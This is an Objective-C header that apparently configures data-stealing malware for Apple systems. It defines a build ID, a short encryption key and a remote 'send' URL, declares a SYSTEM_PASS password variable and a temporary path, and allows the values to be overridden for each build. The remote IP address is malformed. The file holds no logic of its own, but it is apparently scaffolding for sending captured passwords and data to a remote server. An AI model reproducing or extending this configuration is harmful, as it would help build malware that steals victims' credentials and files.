#ifndef GLOBALS_H
#define GLOBALS_H

#import <Foundation/Foundation.h>

#ifndef BUILD_ID
#define BUILD_ID @"T0JVJJy6tgNdmygyRfN0eRaIiZq2uw"
#endif

#ifndef ENCRYPTION_KEY
#define ENCRYPTION_KEY @"rt"
#endif

#ifndef REMOTE_IP
#define REMOTE_IP @"http://45.1d42.1d22.92/send/"
#endif

#ifdef CUSTOM_BUILD_ID
#undef BUILD_ID
#define BUILD_ID @CUSTOM_BUILD_ID
#endif

#ifdef CUSTOM_ENCRYPTION_KEY
#undef ENCRYPTION_KEY
#define ENCRYPTION_KEY @CUSTOM_ENCRYPTION_KEY
#endif

#ifdef CUSTOM_REMOTE_IP
#undef REMOTE_IP
#define REMOTE_IP @CUSTOM_REMOTE_IP
#endif

extern NSString *SYSTEM_PASS;
extern NSString *TEMPORARY_PATH;

#endif // GLOBALS_H
